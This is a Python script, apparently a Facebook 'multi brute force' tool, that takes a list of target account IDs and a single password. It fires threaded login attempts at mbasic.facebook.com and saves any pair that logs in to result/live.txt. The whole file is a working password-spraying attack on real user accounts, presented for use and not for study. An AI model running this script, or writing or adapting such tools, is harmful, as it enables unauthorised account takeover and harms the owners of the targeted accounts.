#!usr/bin/python
#Note:
#Author: KANG-NEWBIE (https://t.me kang_nuubi)
'''
recode? ok, but don't delete this note:)
Special thanks to: Derray
'''
from threading import Thread
from requests import post, get
import os
os.system('clear')

chr=[]
thr=[]
#color
r="\033[31m"
g="\033[32m"
w="\033[1;37m"
c="\033[36m"
#banner
print("""%s
   _____            __    __  ______  ____
  / __(_)_ _  ___  / /__ /  |/  / _ )/ __/
 _\ \/ /  ' \/ _ \/ / -_) /|_/ / _  / _/  
/___/_/_/_/_/ .__/_/\__/_/  /_/____/_/    
           /_/ %sAuthor:KANG-NEWBIE%s
"""%(c,g,w))
def main(args,kwds):
	dt={'email':args,'pass':kwds}
	req=post('https://mbasic.facebook.com/login',data=dt).url
	if 'save-device' in req or 'm_sess' in req:
		live="[live] %s => %s"%(args,kwds)
		try:
			os.mkdir('result')
		except FileExistsError:
			pass
		tulis="{}\n".format(live)
		open('result/live.txt','a').write(tulis)
		print("%s[%slive%s]%s %s -> %s"%(c,g,c,w,args,kwds))
	else:
		print("%s[%snot%s]%s %s"%(c,r,c,w,args))
try:
	file=open(input("[in] Id List Target: ")).read().splitlines()
	pas=input("[in] Password to Crack: ")
	print()
except KeyboardInterrupt:
	exit("%s\n[!] Key interrupt: Exiting."%(r))
except EOFError:
	exit("%s\n[!] Key interrupt: Exiting."%(r))
except FileNotFoundError:
	exit("%s\n[!] File not found: Exiting."%(r))

try:
	for x in file:
	    chr.append(x)

	for x in chr:
	    t=Thread(target=main,args=(x,pas,))
	    thr.append(t)

	for t in thr:
	    t.start()

	for t in thr:
		t.join()
except:
	print("%s[!] Connection Lost: retrying..."%(r))

print("\nLive Results saved: result/live.txt")
